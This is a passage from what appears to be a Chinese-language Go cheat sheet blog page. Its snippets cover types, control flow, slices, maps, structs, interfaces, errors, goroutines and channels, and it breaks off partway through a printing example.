<h3 id="内置类型"><a href="#内置类型" class="headerlink" title="内置类型"></a>内置类型</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span></span><br><span class="line"></span><br><span class="line"><span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>  <span class="type">int8</span>  <span class="type">int16</span>  <span class="type">int32</span>  <span class="type">int64</span></span><br><span class="line"><span class="type">uint</span> <span class="type">uint8</span> <span class="type">uint16</span> <span class="type">uint32</span> <span class="type">uint64</span> <span class="type">uintptr</span></span><br><span class="line"></span><br><span class="line"><span class="type">byte</span> <span class="comment">// alias for uint8</span></span><br><span class="line"></span><br><span class="line"><span class="type">rune</span> <span class="comment">// alias for int32 ~= a character (Unicode code point) - very Viking</span></span><br><span class="line"></span><br><span class="line"><span class="type">float32</span> <span class="type">float64</span></span><br><span class="line"></span><br><span class="line"><span class="type">complex64</span> <span class="type">complex128</span></span><br></pre></td></tr></table></figure>

<p>所有Go的预声明标识符都定义在<span class="exturl" data-url="aHR0cHM6Ly9nb2xhbmcub3JnL3BrZy9idWlsdGluLw==">builtin<i class="fa fa-external-link-alt"></i></span>包中。</p>
<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="type">int</span> = <span class="number">42</span></span><br><span class="line"><span class="keyword">var</span> f <span class="type">float64</span> = <span class="type">float64</span>(i)</span><br><span class="line"><span class="keyword">var</span> u <span class="type">uint</span> = <span class="type">uint</span>(f)</span><br><span class="line"></span><br><span class="line"><span class="comment">// alternative syntax</span></span><br><span class="line">i := <span class="number">42</span></span><br><span class="line">f := <span class="type">float64</span>(i)</span><br><span class="line">u := <span class="type">uint</span>(f)</span><br></pre></td></tr></table></figure>

<h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><ul>
<li>在每个源文件的顶部声明包</li>
<li>可执行文件位于<code>main</code>包中</li>
<li>约定：包的名称等于导入路径的最后一个部分（导入路径<code>math/rand</code> &#x3D;&gt; 包<code>rand</code>）</li>
<li>大写标识符：导出的（可以从其他包中访问）</li>
<li>小写标识符：私有的（不能从其他包中访问）</li>
</ul>
<h3 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h3><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// Basic one</span></span><br><span class="line">	<span class="keyword">if</span> x &gt; <span class="number">10</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> x</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> x == <span class="number">10</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">10</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> -x</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// You can put one statement before the condition</span></span><br><span class="line">	<span class="keyword">if</span> a := b + c; a &lt; <span class="number">42</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a - <span class="number">42</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Type assertion inside if</span></span><br><span class="line">	<span class="keyword">var</span> val <span class="keyword">interface</span>&#123;&#125; = <span class="string">&quot;foo&quot;</span></span><br><span class="line">	<span class="keyword">if</span> str, ok := val.(<span class="type">string</span>); ok &#123;</span><br><span class="line">		fmt.Println(str)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// There&#x27;s only `for`, no `while`, no `until`</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ; i &lt; <span class="number">10</span>;  &#123; <span class="comment">// while - loop</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="number">10</span>  &#123; <span class="comment">// you can omit semicolons if there is only a condition</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> &#123; <span class="comment">// you can omit the condition ~ while (true)</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use break/continue on current loop</span></span><br><span class="line">    <span class="comment">// use break/continue with label on outer loop</span></span><br><span class="line">here:</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := i + <span class="number">1</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span> here</span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Println(j)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">2</span> &#123;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">there:</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := i + <span class="number">1</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">1</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Println(j)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">2</span> &#123;</span><br><span class="line">                <span class="keyword">break</span> there</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// switch statement</span></span><br><span class="line"><span class="keyword">switch</span> operatingSystem &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Mac OS Hipster&quot;</span>)</span><br><span class="line">    <span class="comment">// cases break automatically, no fallthrough by default</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;linux&quot;</span>:</span><br><span class="line">    fmt.Println(<span class="string">&quot;Linux Geek&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="comment">// Windows, BSD, ...</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Other&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// as with for and if, you can have an assignment statement before the switch value</span></span><br><span class="line"><span class="keyword">switch</span> os := runtime.GOOS; os &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;darwin&quot;</span>: ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// you can also make comparisons in switch cases</span></span><br><span class="line">number := <span class="number">42</span></span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> number &lt; <span class="number">42</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Smaller&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> number == <span class="number">42</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Equal&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> number &gt; <span class="number">42</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Greater&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// cases can be presented in comma-separated lists</span></span><br><span class="line"><span class="keyword">var</span> char <span class="type">byte</span> = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"><span class="keyword">switch</span> char &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;Should escape&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数组-切片-遍历"><a href="#数组-切片-遍历" class="headerlink" title="数组, 切片, 遍历"></a>数组, 切片, 遍历</h3><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a [<span class="number">10</span>]<span class="type">int</span> <span class="comment">// declare an int array with length 10. Array length is part of the type!</span></span><br><span class="line">a[<span class="number">3</span>] = <span class="number">42</span>     <span class="comment">// set elements</span></span><br><span class="line">i := a[<span class="number">3</span>]     <span class="comment">// read elements</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// declare and initialize</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">2</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">a := [<span class="number">2</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125; <span class="comment">//shorthand</span></span><br><span class="line">a := [...]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125; <span class="comment">// elipsis -&gt; Compiler figures out array length</span></span><br></pre></td></tr></table></figure>

<h4 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a []<span class="type">int</span>                              <span class="comment">// declare a slice - similar to an array, but length is unspecified</span></span><br><span class="line"><span class="keyword">var</span> a = []<span class="type">int</span> &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;               <span class="comment">// declare and initialize a slice (backed by the array given implicitly)</span></span><br><span class="line">a := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;                   <span class="comment">// shorthand</span></span><br><span class="line">chars := []<span class="type">string</span>&#123;<span class="number">0</span>:<span class="string">&quot;a&quot;</span>, <span class="number">2</span>:<span class="string">&quot;c&quot;</span>, <span class="number">1</span>: <span class="string">&quot;b&quot;</span>&#125;  <span class="comment">// [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = a[lo:hi]	<span class="comment">// creates a slice (view of the array) from index lo to hi-1</span></span><br><span class="line"><span class="keyword">var</span> b = a[<span class="number">1</span>:<span class="number">4</span>]		<span class="comment">// slice from index 1 to 3</span></span><br><span class="line"><span class="keyword">var</span> b = a[:<span class="number">3</span>]		<span class="comment">// missing low index implies 0</span></span><br><span class="line"><span class="keyword">var</span> b = a[<span class="number">3</span>:]		<span class="comment">// missing high index implies len(a)</span></span><br><span class="line">a =  <span class="built_in">append</span>(a,<span class="number">17</span>,<span class="number">3</span>)	<span class="comment">// append items to slice a</span></span><br><span class="line">c := <span class="built_in">append</span>(a,b...)	<span class="comment">// concatenate slices a and b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// create a slice with make</span></span><br><span class="line">a = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">5</span>, <span class="number">5</span>)	<span class="comment">// first arg length, second capacity</span></span><br><span class="line">a = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">5</span>)	<span class="comment">// capacity is optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// create a slice from an array</span></span><br><span class="line">x := [<span class="number">3</span>]<span class="type">string</span>&#123;<span class="string">&quot;Лайка&quot;</span>, <span class="string">&quot;Белка&quot;</span>, <span class="string">&quot;Стрелка&quot;</span>&#125;</span><br><span class="line">s := x[:] <span class="comment">// a slice referencing the storage of x</span></span><br></pre></td></tr></table></figure>

<h4 id="数组和切片的操作"><a href="#数组和切片的操作" class="headerlink" title="数组和切片的操作"></a>数组和切片的操作</h4><p><code>len(a)</code> 返回数组&#x2F;切片的长度。这是一个内置函数，而不是数组的属性&#x2F;方法。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// loop over an array/a slice</span></span><br><span class="line"><span class="keyword">for</span> i, e := <span class="keyword">range</span> a &#123;</span><br><span class="line">    <span class="comment">// i is the index, e the element</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if you only need e:</span></span><br><span class="line"><span class="keyword">for</span> _, e := <span class="keyword">range</span> a &#123;</span><br><span class="line">    <span class="comment">// e is the element</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...and if you only need the index</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> a &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In Go pre-1.4, you&#x27;ll get a compiler error if you&#x27;re not using i and e.</span></span><br><span class="line"><span class="comment">// Go 1.4 introduced a variable-free form, so that you can do this</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">range</span> time.Tick(time.Second) &#123;</span><br><span class="line">    <span class="comment">// do it once a sec</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">m[<span class="string">&quot;key&quot;</span>] = <span class="number">42</span></span><br><span class="line">fmt.Println(m[<span class="string">&quot;key&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(m, <span class="string">&quot;key&quot;</span>)</span><br><span class="line"></span><br><span class="line">elem, ok := m[<span class="string">&quot;key&quot;</span>] <span class="comment">// test if key &quot;key&quot; is present and retrieve it, if so</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map literal</span></span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">map</span>[<span class="type">string</span>]Vertex&#123;</span><br><span class="line">    <span class="string">&quot;Bell Labs&quot;</span>: &#123;<span class="number">40.68433</span>, <span class="number">-74.39967</span>&#125;,</span><br><span class="line">    <span class="string">&quot;Google&quot;</span>:    &#123;<span class="number">37.42202</span>, <span class="number">-122.08408</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// iterate over map content</span></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> m &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>Go中没有类，只有结构体。结构体可以拥有方法。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// A struct is a type. It&#x27;s also a collection of fields</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Declaration</span></span><br><span class="line"><span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">    X, Y <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creating</span></span><br><span class="line"><span class="keyword">var</span> v = Vertex&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line"><span class="keyword">var</span> v = Vertex&#123;X: <span class="number">1</span>, Y: <span class="number">2</span>&#125; <span class="comment">// Creates a struct by defining values with keys</span></span><br><span class="line"><span class="keyword">var</span> v = []Vertex&#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">5</span>,<span class="number">2</span>&#125;,&#123;<span class="number">5</span>,<span class="number">5</span>&#125;&#125; <span class="comment">// Initialize a slice of structs</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Accessing members</span></span><br><span class="line">v.X = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// You can declare methods on structs. The struct you want to declare the</span></span><br><span class="line"><span class="comment">// method on (the receiving type) comes between the the func keyword and</span></span><br><span class="line"><span class="comment">// the method name. The struct is copied on each method call(!)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Vertex)</span></span> Abs() <span class="type">float64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Sqrt(v.X*v.X + v.Y*v.Y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Call method</span></span><br><span class="line">v.Abs()</span><br><span class="line"></span><br><span class="line"><span class="comment">// For mutating methods, you need to use a pointer (see below) to the Struct</span></span><br><span class="line"><span class="comment">// as the type. With this, the struct value is not copied for the method call.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Vertex)</span></span> add(n <span class="type">float64</span>) &#123;</span><br><span class="line">    v.X += n</span><br><span class="line">    v.Y += n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>匿名结构体：</strong> 比使用 <code>map[string]interface&#123;&#125;</code> 更经济和更安全。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">point := <span class="keyword">struct</span> &#123;</span><br><span class="line">	X, Y <span class="type">int</span></span><br><span class="line">&#125;&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">p := Vertex&#123;<span class="number">1</span>, <span class="number">2</span>&#125;  <span class="comment">// p is a Vertex</span></span><br><span class="line">q := &amp;p            <span class="comment">// q is a pointer to a Vertex</span></span><br><span class="line">r := &amp;Vertex&#123;<span class="number">1</span>, <span class="number">2</span>&#125; <span class="comment">// r is also a pointer to a Vertex</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The type of a pointer to a Vertex is *Vertex</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s *Vertex = <span class="built_in">new</span>(Vertex) <span class="comment">// new creates a pointer to a new struct instance</span></span><br></pre></td></tr></table></figure>

<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// interface declaration</span></span><br><span class="line"><span class="keyword">type</span> Awesomizer <span class="keyword">interface</span> &#123;</span><br><span class="line">    Awesomize() <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// types do *not* declare to implement interfaces</span></span><br><span class="line"><span class="keyword">type</span> Foo <span class="keyword">struct</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// instead, types implicitly satisfy an interface if they implement all required methods</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foo Foo)</span></span> Awesomize() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Awesome!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="嵌入"><a href="#嵌入" class="headerlink" title="嵌入"></a>嵌入</h3><p>Go中没有子类化。相反，有接口和结构体嵌入。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ReadWriter implementations must satisfy both Reader and Writer</span></span><br><span class="line"><span class="keyword">type</span> ReadWriter <span class="keyword">interface</span> &#123;</span><br><span class="line">    Reader</span><br><span class="line">    Writer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Server exposes all the methods that Logger has</span></span><br><span class="line"><span class="keyword">type</span> Server <span class="keyword">struct</span> &#123;</span><br><span class="line">    Host <span class="type">string</span></span><br><span class="line">    Port <span class="type">int</span></span><br><span class="line">    *log.Logger</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize the embedded type the usual way</span></span><br><span class="line">server := &amp;Server&#123;<span class="string">&quot;localhost&quot;</span>, <span class="number">80</span>, log.New(...)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// methods implemented on the embedded struct are passed through</span></span><br><span class="line">server.Log(...) <span class="comment">// calls server.Logger.Log(...)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// the field name of the embedded type is its type name (in this case Logger)</span></span><br><span class="line"><span class="keyword">var</span> logger *log.Logger = server.Logger</span><br></pre></td></tr></table></figure>

<h3 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h3><p>Go中没有异常处理。相反，可能产生错误的函数只是声明了一个额外的返回值，类型为<a href="https://golang.org/pkg/builtin/#error"><code>error</code></a>。这是<code>error</code>接口：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The error built-in interface type is the conventional interface for representing an error condition,</span></span><br><span class="line"><span class="comment">// with the nil value representing no error.</span></span><br><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sqrt</span><span class="params">(x <span class="type">float64</span>)</span></span> (<span class="type">float64</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> x &lt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>, errors.New(<span class="string">&quot;negative value&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> math.Sqrt(x), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	val, err := sqrt(<span class="number">-1</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// handle error</span></span><br><span class="line">		fmt.Println(err) <span class="comment">// negative value</span></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// All is good, use `val`.</span></span><br><span class="line">	fmt.Println(val)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>Goroutines是轻量级线程（由Go管理，而不是操作系统线程）。<code>go f(a, b)</code>启动一个新的goroutine来运行<code>f</code>（假设<code>f</code>是一个函数）。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// just a function (which can be later started as a goroutine)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doStuff</span><span class="params">(s <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// using a named function in a goroutine</span></span><br><span class="line">    <span class="keyword">go</span> doStuff(<span class="string">&quot;foobar&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// using an anonymous inner function in a goroutine</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span> <span class="params">(x <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">        <span class="comment">// function body goes here</span></span><br><span class="line">    &#125;(<span class="number">42</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通道"><a href="#通道" class="headerlink" title="通道"></a>通道</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>) <span class="comment">// create a channel of type int</span></span><br><span class="line">ch &lt;- <span class="number">42</span>             <span class="comment">// Send a value to the channel ch.</span></span><br><span class="line">v := &lt;-ch            <span class="comment">// Receive a value from ch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Non-buffered channels block. Read blocks when no value is available, write blocks until there is a read.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a buffered channel. Writing to a buffered channels does not block if less than &lt;buffer size&gt; unread values have been written.</span></span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(ch) <span class="comment">// closes the channel (only sender should close)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// read from channel and test if it has been closed</span></span><br><span class="line">v, ok := &lt;-ch</span><br><span class="line"></span><br><span class="line"><span class="comment">// if ok is false, channel has been closed</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Read from channel until it is closed</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> ch &#123;</span><br><span class="line">    fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// select blocks on multiple channel operations, if one unblocks, the corresponding case is executed</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doStuff</span><span class="params">(channelOut, channelIn <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> channelOut &lt;- <span class="number">42</span>:</span><br><span class="line">        fmt.Println(<span class="string">&quot;We could write to channelOut!&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> x := &lt;- channelIn:</span><br><span class="line">        fmt.Println(<span class="string">&quot;We could read from channelIn&quot;</span>)</span><br><span class="line">    <span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">1</span>):</span><br><span class="line">        fmt.Println(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="通道原理"><a href="#通道原理" class="headerlink" title="通道原理"></a>通道原理</h4><ul>
<li><p>向空通道发送会永远阻塞</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c <span class="keyword">chan</span> <span class="type">string</span></span><br><span class="line">c &lt;- <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"><span class="comment">// fatal error: all goroutines are asleep - deadlock!</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>从空通道接收会永远阻塞。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c <span class="keyword">chan</span> <span class="type">string</span></span><br><span class="line">fmt.Println(&lt;-c)</span><br><span class="line"><span class="comment">// fatal error: all goroutines are asleep - deadlock!</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>向已关闭的通道发送会引发恐慌。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line">c &lt;- <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"><span class="built_in">close</span>(c)</span><br><span class="line">c &lt;- <span class="string">&quot;Hello, Panic!&quot;</span></span><br><span class="line"><span class="comment">// panic: send on closed channel</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>从已关闭的通道接收会立即返回零值。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">c &lt;- <span class="number">1</span></span><br><span class="line">c &lt;- <span class="number">2</span></span><br><span class="line"><span class="built_in">close</span>(c)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%d &quot;</span>, &lt;-c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1 2 0</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fmt.Println(<span class="string">&quot;Hello, 你好, नमस्ते, Привет, ᎣᏏᏲ&quot;</span>) <span class="comment">// basic print, plus newline</span></span><br><span class="line">p := <span class="keyword">struct</span> &#123; X, Y <span class="type">int</span> &#125;&#123; <span class="number">17</span>, <span class="number">2</span> &#125;</span><br><span class="line">fmt.Println( <span class="string">&quot;My point:&quot;</span>, p, <span class="string">&quot;x coord=&quot;</span>, p.X ) <span class="comment">// print structs, ints, etc</span></span><br><span class="line">s := fmt.Sprintln( <span class="string">&quot;My point:&quot;</span>, p, <span class="string">&quot;x coord=&quot;</span>, p.X ) <span class="comment">// print to string variable</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d hex:%x bin:%b fp:%f sci:%e&quot;</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17</span>,<span class="number">17.0</span>,<span class="number">17.0</span>) <span class="comment">// c-ish format</span></span><br><span class="line">s2 := fmt.Sprintf( <span class="string">&quot;%d %f&quot;</span>, <span class="number">17</span>, <span class="number">17.0</span> ) <span class="comment">// formatted print to string variable</span></span><br><span class="line"></span><br><span class="line">hellomsg := <span class="string">`</span></span><br><span class="line"><span class="string"> &quot;Hello&quot; in Chinese is 你好 (&#x27;Ni Hao&#x27;)</span></span><br><span class="line"><span 